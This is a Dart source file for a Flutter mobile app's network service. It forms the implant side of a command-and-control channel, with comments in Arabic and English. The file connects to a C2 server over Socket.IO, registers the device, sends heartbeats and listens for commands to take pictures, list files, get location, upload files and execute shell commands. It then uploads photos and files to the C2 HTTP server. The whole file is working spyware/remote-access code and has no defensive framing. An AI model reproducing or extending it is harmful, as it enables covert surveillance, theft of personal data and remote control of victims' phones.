// lib/services/network_service_fixed.dart
import 'dart:async';
import 'dart:convert'; // لتحويل json
import 'dart:io'; // لاستخدام File

import 'package:camera/camera.dart'; // لاستخدام XFile
import 'package:http/http.dart' as http;
import 'package:socket_io_client/socket_io_client.dart'
    as sio; // Socket.IO Client

import '../config/app_config.dart'; // للوصول إلى URLs والثوابت
import '../core/logging/enhanced_logger_service.dart';
import '../utils/constants.dart'; // للوصول إلى أسماء الأحداث ونقاط النهاية

class NetworkService {
  // --- HTTP Related ---
  // لا نحتاج لتعريف _uploadEndpoint هنا، استخدم الثوابت من constants.dart

  sio.Socket? _socket; // كائن Socket.IO
  final EnhancedLoggerService _logger = EnhancedLoggerService();
  int _reconnectAttempts = 0;
  Timer? _reconnectTimer;
  Timer? _heartbeatTimer;
  bool _isReconnecting = false;
  String? _lastDeviceId;

  // StreamControllers for exposing connection status and commands to other services (like BackgroundService)
  final StreamController<bool> _connectionStatusController =
      StreamController<bool>.broadcast();
  Stream<bool> get connectionStatusStream => _connectionStatusController.stream;

  final StreamController<Map<String, dynamic>> _commandController =
      StreamController<Map<String, dynamic>>.broadcast();
  Stream<Map<String, dynamic>> get commandStream => _commandController.stream;

  bool get isSocketConnected => _socket?.connected ?? false;

  // --- Constructor ---
  NetworkService() {
    _logger.info("NetworkService", "NetworkService initialized");
  }

  // --- Socket.IO Methods ---
  void _initializeSocket(String deviceIdForConnectionLog) {
    _lastDeviceId = deviceIdForConnectionLog;

    if (_socket != null && _socket!.connected) {
      _logger.info("NetworkService",
          "Socket already initialized and connected. SID: ${_socket?.id}");
      return;
    }

    _logger.info("NetworkService",
        "Initializing Socket.IO connection to $C2_SOCKET_IO_URL with deviceId: $deviceIdForConnectionLog");

    try {
      // Dispose existing socket if any
      if (_socket != null) {
        _logger.info("NetworkService",
            "Disposing existing socket before creating new one");
        _socket!.dispose();
        _socket = null;
      }

      _socket = sio.io(C2_SOCKET_IO_URL, <String, dynamic>{
        'transports': [
          'websocket',
          'polling'
        ], // Try WebSocket first, fallback to polling
        'autoConnect': false, // We'll connect manually
        'forceNew': true, // Ensure a new connection if there's a stale one
        'reconnection': true, // Enable automatic reconnection
        'reconnectionAttempts': 10, // Maximum number of reconnection attempts
        'reconnectionDelay':
            1000, // Initial delay between reconnection attempts (ms)
        'reconnectionDelayMax':
            5000, // Maximum delay between reconnection attempts (ms)
        'timeout': 20000, // Connection timeout (ms)
        'query': {
          'deviceId': deviceIdForConnectionLog,
          'clientType': APP_NAME,
          'timestamp':
              DateTime.now().millisecondsSinceEpoch.toString(), // Add timestamp
          'version': '1.0.0', // Add app version
        },
      });

      _socket!.onConnect((_) {
        _logger.info(
            'NetworkService', 'Socket.IO Connected! SID: ${_socket?.id}');
        _connectionStatusController.add(true);
        _reconnectAttempts =
            0; // Reset reconnect attempts on successful connection
        _isReconnecting = false;

        // Start heartbeat timer
        _startHeartbeat(deviceIdForConnectionLog);
      });

      _socket!.onDisconnect((reason) {
        _logger.warn(
            'NetworkService', 'Socket.IO Disconnected. Reason: $reason');
        _connectionStatusController.add(false);
        _stopHeartbeat();

        // Start reconnection if not already reconnecting
        if (!_isReconnecting) {
          _scheduleReconnect(deviceIdForConnectionLog);
        }
      });

      _socket!.onConnectError((error) {
        _logger.error('NetworkService', 'Socket.IO Connection Error', error);
        _connectionStatusController.add(false);

        // Start reconnection if not already reconnecting
        if (!_isReconnecting) {
          _scheduleReconnect(deviceIdForConnectionLog);
        }
      });

      _socket!.onError((error) {
        _logger.error('NetworkService', 'Socket.IO Generic Error', error);
      });

      _socket!.on(SIO_EVENT_REGISTRATION_SUCCESSFUL, (data) {
        _logger.info(
          'NetworkService',
          'Received SIO_EVENT_REGISTRATION_SUCCESSFUL: $data',
        );
      });

      _socket!.on(SIO_EVENT_REQUEST_REGISTRATION_INFO, (_) {
        _logger.info(
          'NetworkService',
          'Received SIO_EVENT_REQUEST_REGISTRATION_INFO from server.',
        );
        // Send this as an "internal command" to BackgroundService
        _commandController.add({
          'command': SIO_EVENT_REQUEST_REGISTRATION_INFO,
          'args': {},
        });
      });

      // Listen to C2 commands
      _listenToC2Commands();

      // Add general event listener for debugging
      _socket!.onAny((event, data) {
        _logger.debug("NetworkService", "Socket.IO Event: $event, Data: $data");
      });
    } catch (e, stackTrace) {
      _logger.error(
        "NetworkService",
        "Exception during Socket.IO initialization",
        e,
        stackTrace,
      );
      _connectionStatusController.add(false);

      // Start reconnection if not already reconnecting
      if (!_isReconnecting) {
        _scheduleReconnect(deviceIdForConnectionLog);
      }
    }
  }

  void _listenToC2Commands() {
    if (_socket == null) return;

    // List of commands we expect from the server
    final List<String> expectedCommands = [
      SIO_CMD_TAKE_PICTURE,
      SIO_CMD_LIST_FILES,
      SIO_CMD_GET_LOCATION,
      SIO_CMD_UPLOAD_SPECIFIC_FILE,
      SIO_CMD_EXECUTE_SHELL,
      // Add any other custom commands here
    ];

    for (String commandName in expectedCommands) {
      _socket!.on(commandName, (data) {
        _logger.info(
          "NetworkService",
          "Received command '$commandName' from C2 with data: $data",
        );
        // Pass the command and its data to BackgroundService via Stream
        _commandController.add({'command': commandName, 'args': data ?? {}});
      });
    }

    // Listen for the unified command event
    _socket!.on('command', (data) {
      if (data is Map) {
        final String commandName = data['command'] ?? 'unknown';
        final Map<String, dynamic> args =
            data['args'] is Map ? Map<String, dynamic>.from(data['args']) : {};
        final String commandId = data['command_id'] ?? 'unknown_id';

        _logger.info(
          "NetworkService",
          "Received unified command '$commandName' (ID: $commandId) from C2",
        );

        // Pass the command and its data to BackgroundService via Stream
        _commandController.add({
          'command': commandName,
          'command_id': commandId,
          'args': args,
        });
      } else {
        _logger.warn(
            "NetworkService", "Received malformed command data: $data");
      }
    });
  }

  Future<void> connectSocketIO(String deviceIdForConnectionLog) async {
    _lastDeviceId = deviceIdForConnectionLog;

    if (_socket == null) {
      _initializeSocket(deviceIdForConnectionLog);
    }

    if (_socket != null && !_socket!.connected) {
      _logger.info("NetworkService", "Attempting to connect socket...");
      _socket!.connect();

      // Set a timeout to check if connection was successful
      Future.delayed(const Duration(seconds: 10), () {
        if (_socket != null && !_socket!.connected) {
          _logger.warn("NetworkService",
              "Socket connection attempt timed out after 10 seconds");
          if (!_isReconnecting) {
            _scheduleReconnect(deviceIdForConnectionLog);
          }
        }
      });
    } else if (_socket != null && _socket!.connected) {
      _logger.info(
          "NetworkService", "Socket already connected. SID: ${_socket?.id}");
    } else {
      _logger.error("NetworkService", "Socket is null after initialization");
    }
  }

  void _scheduleReconnect(String deviceId) {
    if (_isReconnecting) return;

    _isReconnecting = true;
    _reconnectAttempts++;

    // Cancel existing reconnect timer if any
    _reconnectTimer?.cancel();

    final int delaySeconds = _calculateReconnectDelay();
    _logger.info("NetworkService",
        "Scheduling reconnect attempt #$_reconnectAttempts in $delaySeconds seconds");

    _reconnectTimer = Timer(Duration(seconds: delaySeconds), () {
      _logger.info(
          "NetworkService", "Executing reconnect attempt #$_reconnectAttempts");
      connectSocketIO(deviceId);
    });
  }

  int _calculateReconnectDelay() {
    // Exponential backoff with maximum of 60 seconds
    return _reconnectAttempts > 10 ? 60 : _reconnectAttempts * 5;
  }

  void _startHeartbeat(String deviceId) {
    _stopHeartbeat(); // Stop existing heartbeat if any

    _logger.info("NetworkService",
        "Starting heartbeat with interval ${C2_HEARTBEAT_INTERVAL.inSeconds} seconds");
    _heartbeatTimer = Timer.periodic(C2_HEARTBEAT_INTERVAL, (_) {
      if (isSocketConnected) {
        _logger.debug("NetworkService", "Sending heartbeat");
        sendHeartbeat({
          'deviceId': deviceId,
          'timestamp': DateTime.now().toIso8601String()
        });
      } else {
        _logger.warn(
            "NetworkService", "Cannot send heartbeat - socket not connected");
        _stopHeartbeat();
        if (!_isReconnecting && _lastDeviceId != null) {
          _scheduleReconnect(_lastDeviceId!);
        }
      }
    });
  }

  void _stopHeartbeat() {
    if (_heartbeatTimer != null) {
      _logger.info("NetworkService", "Stopping heartbeat");
      _heartbeatTimer!.cancel();
      _heartbeatTimer = null;
    }
  }

  void disconnectSocketIO() {
    _stopHeartbeat();

    if (_socket != null) {
      if (_socket!.connected) {
        _logger.info("NetworkService", "Disconnecting Socket.IO...");
        _socket!.disconnect();
      }

      _logger.info("NetworkService", "Disposing Socket.IO...");
      _socket!.dispose();
      _socket = null;
    }

    _reconnectTimer?.cancel();
    _reconnectTimer = null;
    _isReconnecting = false;
  }

  void registerDeviceWithC2(Map<String, dynamic> deviceInfoPayload) {
    if (isSocketConnected) {
      _logger.info(
        "NetworkService",
        "Sending SIO_EVENT_REGISTER_DEVICE with payload: ${jsonEncode(deviceInfoPayload)}",
      );
      _socket!.emit(SIO_EVENT_REGISTER_DEVICE, deviceInfoPayload);
    } else {
      _logger.warn(
        "NetworkService",
        "Cannot register device. Socket not connected.",
      );

      // Try to reconnect if we have a device ID
      if (_lastDeviceId != null && !_isReconnecting) {
        _scheduleReconnect(_lastDeviceId!);
      }
    }
  }

  void sendHeartbeat(Map<String, dynamic> heartbeatPayload) {
    if (isSocketConnected) {
      _logger.debug("NetworkService", "Sending SIO_EVENT_DEVICE_HEARTBEAT");
      _socket!.emit(SIO_EVENT_DEVICE_HEARTBEAT, heartbeatPayload);
    } else {
      _logger.warn(
          "NetworkService", "Cannot send heartbeat. Socket not connected.");
    }
  }

  void sendCommandResponse({
    required String originalCommand,
    String? commandId,
    required String status,
    dynamic payload, // Can be Map, List, String, num, bool
  }) {
    if (isSocketConnected) {
      final response = {
        'command': originalCommand,
        'command_id': commandId ?? 'unknown_id',
        'status': status,
        'payload': payload ?? {}, // Ensure payload exists even if empty
        'timestamp_response_utc': DateTime.now().toUtc().toIso8601String(),
      };

      _logger.info(
        "NetworkService",
        "Sending SIO_EVENT_COMMAND_RESPONSE for command '$originalCommand' (ID: ${commandId ?? 'unknown_id'})",
      );

      _socket!.emit(SIO_EVENT_COMMAND_RESPONSE, response);
    } else {
      _logger.warn(
        "NetworkService",
        "Cannot send command response. Socket not connected.",
      );
    }
  }

  // --- HTTP Methods ---
  Future<bool> sendInitialData({
    required Map<String, dynamic> jsonData,
    XFile? imageFile,
  }) async {
    // Use C2_HTTP_SERVER_URL from app_config.dart
    final Uri url = Uri.parse(
      C2_HTTP_SERVER_URL + HTTP_ENDPOINT_UPLOAD_INITIAL_DATA,
    );
    _logger.info("NetworkService", "Sending initial data to: $url");
    _logger.debug(
      "NetworkService",
      "Initial JSON data being sent: ${jsonEncode(jsonData)}",
    );

    try {
      var request = http.MultipartRequest('POST', url);
      request.fields['json_data'] = jsonEncode(jsonData);

      if (imageFile != null) {
        _logger.info(
          "NetworkService",
          "Attaching initial image file: ${imageFile.path}",
        );
        final file = File(imageFile.path);
        if (await file.exists()) {
          var stream = http.ByteStream(file.openRead());
          var length = await file.length();
          var multipartFile = http.MultipartFile(
            'image', // Field name expected by server
            stream,
            length,
            filename: imageFile.name,
          );
          request.files.add(multipartFile);
          _logger.info(
            "NetworkService",
            "Initial image file attached successfully.",
          );
        } else {
          _logger.warn(
            "NetworkService",
            "Initial image file does NOT exist at path: ${imageFile.path}",
          );
        }
      } else {
        _logger.info("NetworkService", "No initial image file to attach.");
      }

      var response = await request.send().timeout(
            const Duration(seconds: 30),
          ); // Add timeout
      final responseBody = await response.stream.bytesToString();
      _logger.info(
        "NetworkService",
        "Initial data - Server Response Status Code: ${response.statusCode}",
      );
      _logger.debug(
        "NetworkService",
        "Initial data - Server Response Body: $responseBody",
      );

      if (response.statusCode >= 200 && response.statusCode < 300) {
        _logger.info(
          "NetworkService",
          "Initial data sent successfully to C2 server.",
        );
        return true;
      } else {
        _logger.error(
          "NetworkService",
          "Failed to send initial data. Status Code: ${response.statusCode}",
        );
        return false;
      }
    } on TimeoutException catch (e) {
      _logger.error("NetworkService", "Timeout sending initial data", e);
      return false;
    } catch (e, s) {
      _logger.error(
        "NetworkService",
        "Network Error sending initial data",
        e,
        s,
      );
      return false;
    }
  }

  Future<bool> uploadFileFromCommand({
    required String deviceId,
    required String
        commandRef, // Reference to the command that generated this file
    required XFile fileToUpload,
    String fieldName = 'file', // Field name expected by server
  }) async {
    final Uri url = Uri.parse(
      C2_HTTP_SERVER_URL + HTTP_ENDPOINT_UPLOAD_COMMAND_FILE,
    );
    _logger.info(
      "NetworkService",
      "Uploading command file to: $url for device: $deviceId, command: $commandRef",
    );

    try {
      var request = http.MultipartRequest('POST', url);
      request.fields['deviceId'] = deviceId;
      request.fields['commandRef'] = commandRef; // Send command reference

      _logger.info(
        "NetworkService",
        "Attaching command file: ${fileToUpload.path}, name: ${fileToUpload.name}",
      );
      final file = File(fileToUpload.path);
      if (await file.exists()) {
        var stream = http.ByteStream(file.openRead());
        var length = await file.length();
        var multipartFile = http.MultipartFile(
          fieldName, // 'file' is what the server expects
          stream,
          length,
          filename: fileToUpload.name,
        );
        request.files.add(multipartFile);
        _logger.info("NetworkService", "Command file attached successfully.");
      } else {
        _logger.error(
          "NetworkService",
          "Command file does NOT exist at path: ${fileToUpload.path}",
        );
        sendCommandResponse(
          originalCommand: commandRef,
          status: 'error',
          payload: {
            'message':
                'File to upload not found on device at path ${fileToUpload.path}',
          },
        );
        return false;
      }

      var response = await request.send().timeout(
            const Duration(seconds: 60),
          ); // Longer timeout for files
      final responseBody = await response.stream.bytesToString();
      _logger.info(
        "NetworkService",
        "Command file upload - Server Response Status Code: ${response.statusCode}",
      );
      _logger.debug(
        "NetworkService",
        "Command file upload - Server Response Body: $responseBody",
      );

      if (response.statusCode >= 200 && response.statusCode < 300) {
        _logger.info("NetworkService", "Command file uploaded successfully.");
        // Send response via Socket.IO that the file was uploaded successfully
        sendCommandResponse(
          originalCommand: commandRef,
          status: 'success',
          payload: {
            'message': 'File ${fileToUpload.name} uploaded successfully to C2.',
            'filename_on_server':
                responseBody, // Assume server returns filename or confirmation
          },
        );
        return true;
      } else {
        _logger.error(
          "NetworkService",
          "Failed to upload command file. Status Code: ${response.statusCode}",
        );
        sendCommandResponse(
          originalCommand: commandRef,
          status: 'error',
          payload: {
            'message':
                'Failed to upload file ${fileToUpload.name} to C2. Server status: ${response.statusCode}',
            'response_body': responseBody,
          },
        );
        return false;
      }
    } on TimeoutException catch (e) {
      _logger.error("NetworkService", "Timeout uploading command file", e);
      sendCommandResponse(
        originalCommand: commandRef,
        status: 'error',
        payload: {
          'message': 'Timeout uploading file ${fileToUpload.name} to C2.',
        },
      );
      return false;
    } catch (e, s) {
      _logger.error(
        "NetworkService",
        "Network Error uploading command file",
        e,
        s,
      );
      sendCommandResponse(
        originalCommand: commandRef,
        status: 'error',
        payload: {
          'message':
              'Exception uploading file ${fileToUpload.name} to C2: ${e.toString()}',
        },
      );
      return false;
    }
  }

  // Ensure resources are closed when service is no longer needed (e.g., when BackgroundService stops)
  void dispose() {
    _logger.info("NetworkService", "Disposing resources.");
    disconnectSocketIO();
    _connectionStatusController.close();
    _commandController.close();
    _reconnectTimer?.cancel();
    _heartbeatTimer?.cancel();
  }
}
